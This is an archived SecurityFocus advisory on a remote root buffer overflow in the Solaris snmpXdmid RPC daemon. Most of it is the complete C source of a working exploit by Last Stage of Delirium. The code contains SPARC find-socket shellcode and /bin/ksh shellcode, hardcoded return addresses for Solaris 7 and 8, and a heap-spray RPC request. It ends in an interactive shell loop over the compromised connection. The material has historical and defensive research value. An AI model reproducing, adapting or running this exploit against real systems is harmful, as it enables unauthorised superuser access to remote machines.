source: http://www.securityfocus.com/bid/2417/info

Versions 2.6, 7, and 8 of Sun Microsystem's Solaris operating environment ship with service called 'snmpXdmid'. This daemon is used to map SNMP management requests to DMI requests and vice versa.

SnmpXdmid contains a remotely exploitable buffer overflow vulnerability. The overflow occurs when snmpXdmid attempts to translate a 'malicious' DMI request into an SNMP trap.

SnmpXdmid runs with root privileges and any attacker to successfully exploit this vulnerability will gain superuser access immediately. 

/*## copyright LAST STAGE OF DELIRIUM mar 2001 poland        *://lsd-pl.net/ #*/
/*## snmpXdmid                                                               #*/

/* as the final jump to the assembly code is made to the heap area, this code */ 
/* also works against machines with non-exec stack protection turned on       */ 
/* due to large data transfers of about 128KB, the code may need some time to */
/* proceed, so be patient                                                     */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <rpc/rpc.h>
#include <netdb.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

#define SNMPXDMID_PROG 100249
#define SNMPXDMID_VERS 0x1
#define SNMPXDMID_ADDCOMPONENT 0x101

char findsckcode[]=
    "\x20\xbf\xff\xff"     /* bn,a    <findsckcode-4>        */
    "\x20\xbf\xff\xff"     /* bn,a    <findsckcode>          */
    "\x7f\xff\xff\xff"     /* call    <findsckcode+4>        */
    "\x33\x02\x12\x34"
    "\xa0\x10\x20\xff"     /* mov     0xff,%l0               */
    "\xa2\x10\x20\x54"     /* mov     0x54,%l1               */
    "\xa4\x03\xff\xd0"     /* add     %o7,-48,%l2            */
    "\xaa\x03\xe0\x28"     /* add     %o7,40,%l5             */
    "\x81\xc5\x60\x08"     /* jmp     %l5+8                  */
    "\xc0\x2b\xe0\x04"     /* stb     %g0,[%o7+4]            */
    "\xe6\x03\xff\xd0"     /* ld      [%o7-48],%l3           */
    "\xe8\x03\xe0\x04"     /* ld      [%o7+4],%l4            */
    "\xa8\xa4\xc0\x14"     /* subcc   %l3,%l4,%l4            */
    "\x02\xbf\xff\xfb"     /* bz      <findsckcode+32>       */
    "\xaa\x03\xe0\x5c"     /* add     %o7,92,%l5             */
    "\xe2\x23\xff\xc4"     /* st      %l1,[%o7-60]           */
    "\xe2\x23\xff\xc8"     /* st      %l1,[%o7-56]           */
    "\xe4\x23\xff\xcc"     /* st      %l2,[%o7-52]           */
    "\x90\x04\x20\x01"     /* add     %l0,1,%o0              */
    "\xa7\x2c\x60\x08"     /* sll     %l1,8,%l3              */
    "\x92\x14\xe0\x91"     /* or      %l3,0x91,%o1           */
    "\x94\x03\xff\xc4"     /* add     %o7,-60,%o2            */
    "\x82\x10\x20\x36"     /* mov     0x36,%g1               */
    "\x91\xd0\x20\x08"     /* ta      8                      */
    "\x1a\xbf\xff\xf1"     /* bcc     <findsckcode+36>       */
    "\xa0\xa4\x20\x01"     /* deccc   %l0                    */
    "\x12\xbf\xff\xf5"     /* bne     <findsckcode+60>       */
    "\xa6\x10\x20\x03"     /* mov     0x03,%l3               */
    "\x90\x04\x20\x02"     /* add     %l0,2,%o0              */
    "\x92\x10\x20\x09"     /* mov     0x09,%o1               */
    "\x94\x04\xff\xff"     /* add     %l3,-1,%o2             */
    "\x82\x10\x20\x3e"     /* mov     0x3e,%g1               */
    "\xa6\x84\xff\xff"     /* addcc   %l3,-1,%l3             */
    "\x12\xbf\xff\xfb"     /* bne     <findsckcode+112>      */
    "\x91\xd0\x20\x08"     /* ta      8                      */
;

char shellcode[]=
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>          */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>            */
    "\x7f\xff\xff\xff"     /* call    <shellcode+4>          */
    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0             */
    "\x92\x02\x20\x10"     /* add     %o0,16,%o1             */
    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]            */
    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]           */
    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]           */
    "\x82\x10\x20\x0b"     /* mov     0x0b,%g1               */
    "\x91\xd0\x20\x08"     /* ta      8                      */
    "/bin/ksh"
;

static char nop[]="\x80\x1c\x40\x11";

typedef struct{
    struct{unsigned int len;char *val;}name;
    struct{unsigned int len;char *val;}pragma;
}req_t;

bool_t xdr_req(XDR *xdrs,req_t *objp){
    char *v=NULL;unsigned long l=0;int b=1;
    if(!xdr_u_long(xdrs,&l)) return(FALSE);
    if(!xdr_pointer(xdrs,&v,0,(xdrproc_t)NULL)) return(FALSE);
    if(!xdr_bool(xdrs,&b)) return(FALSE);
    if(!xdr_u_long(xdrs,&l)) return(FALSE);
    if(!xdr_bool(xdrs,&b)) return(FALSE);
    if(!xdr_array(xdrs,&objp->name.val,&objp->name.len,~0,sizeof(char),
        (xdrproc_t)xdr_char)) return(FALSE);
    if(!xdr_bool(xdrs,&b)) return(FALSE);
    if(!xdr_array(xdrs,&objp->pragma.val,&objp->pragma.len,~0,sizeof(char),
        (xdrproc_t)xdr_char)) return(FALSE);
    if(!xdr_pointer(xdrs,&v,0,(xdrproc_t)NULL)) return(FALSE);
    if(!xdr_u_long(xdrs,&l)) return(FALSE);
    return(TRUE);
}

main(int argc,char **argv){
    char buffer[140000],address[4],pch[4],*b;
    int i,c,n,vers=-1,port=0,sck;
    CLIENT *cl;enum clnt_stat stat;
    struct hostent *hp;
    struct sockaddr_in adr;
    struct timeval tm={10,0};
    req_t req;

    printf("copyright LAST STAGE OF DELIRIUM mar 2001 poland  //lsd-pl.net/\n");
    printf("snmpXdmid for solaris 2.7 2.8 sparc\n\n");

    if(argc<2){
        printf("usage: %s address [-p port] -v 7|8\n",argv[0]);
        exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"p:v:"))!=-1){
        switch(c){
        case 'p': port=atoi(optarg);break;
        case 'v': vers=atoi(optarg);
        }
    }
    switch(vers){
    case 7: *(unsigned int*)address=0x000b1868;break;
    case 8: *(unsigned int*)address=0x000cf2c0;break;
    default: exit(-1);
    }

    *(unsigned long*)pch=htonl(*(unsigned int*)address+32000);
    *(unsigned long*)address=htonl(*(unsigned int*)address+64000+32000);

    printf("adr=0x%08x timeout=%d ",ntohl(*(unsigned long*)address),tm.tv_sec);
    fflush(stdout);

    adr.sin_family=AF_INET;
    adr.sin_port=htons(port);
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL){
            errno=EADDRNOTAVAIL;perror("error");exit(-1);
        }
        memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
    }

    sck=RPC_ANYSOCK;
    if(!(cl=clnttcp_create(&adr,SNMPXDMID_PROG,SNMPXDMID_VERS,&sck,0,0))){
        clnt_pcreateerror("error");exit(-1);
    }
    cl->cl_auth=authunix_create("localhost",0,0,0,NULL);

    i=sizeof(struct sockaddr_in);
    if(getsockname(sck,(struct sockaddr*)&adr,&i)==-1){
        struct{unsigned int maxlen;unsigned int len;char *buf;}nb;
        ioctl(sck,(('S'<<8)|2),"sockmod");
        nb.maxlen=0xffff;
        nb.len=sizeof(struct sockaddr_in);;
        nb.buf=(char*)&adr;
        ioctl(sck,(('T'<<8)|144),&nb);
    }
    n=ntohs(adr.sin_port);
    printf("port=%d connected! ",n);fflush(stdout);

    findsckcode[12+2]=(unsigned char)((n&0xff00)>>8);
    findsckcode[12+3]=(unsigned char)(n&0xff);

    b=&buffer[0];
    for(i=0;i<1248;i++) *b++=pch[i%4];
    for(i=0;i<352;i++) *b++=address[i%4];
    *b=0;

    b=&buffer[10000];
    for(i=0;i<64000;i++) *b++=0;
    for(i=0;i<64000-188;i++) *b++=nop[i%4];
    for(i=0;i<strlen(findsckcode);i++) *b++=findsckcode[i];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    *b=0;

    req.name.len=1200+400+4;
    req.name.val=&buffer[0];
    req.pragma.len=128000+4;
    req.pragma.val=&buffer[10000];

    stat=clnt_call(cl,SNMPXDMID_ADDCOMPONENT,xdr_req,&req,xdr_void,NULL,tm);
    if(stat==RPC_SUCCESS) {printf("\nerror: not vulnerable\n");exit(-1);}
    printf("sent!\n");

    write(sck,"/bin/uname -a\n",14);
    while(1){
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(0,&fds);
        FD_SET(sck,&fds);
        if(select(FD_SETSIZE,&fds,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&fds)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(sck,buf,cnt);
            }
            if(FD_ISSET(sck,&fds)){
                if((cnt=read(sck,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(1,buf,cnt);
            }
        }
    }
}